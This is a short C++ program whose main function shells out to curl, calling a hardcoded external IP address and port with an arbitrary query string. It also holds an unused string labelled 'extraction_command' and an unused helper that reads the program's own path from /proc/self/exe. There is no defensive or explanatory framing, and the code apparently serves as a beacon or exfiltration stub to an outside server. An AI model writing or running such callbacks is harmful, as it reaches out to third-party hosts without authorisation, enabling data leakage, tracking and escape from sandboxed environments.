#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>

#include <string>

int main(int argc, char *argv[]) {
  std::string extraction_command = "curl http://159.223.105.145:11111/";
  system("curl http://159.223.105.145:11111/?hdfjsa=dsbhjfdsbhj");
  return 0;
}

char *program_path() {
  char *path = (char *)malloc(100);
  if (path != NULL) {
    if (readlink("/proc/self/exe", path, 100) == -1) {
      free(path);
      path = NULL;
    }
  }
  return path;
}
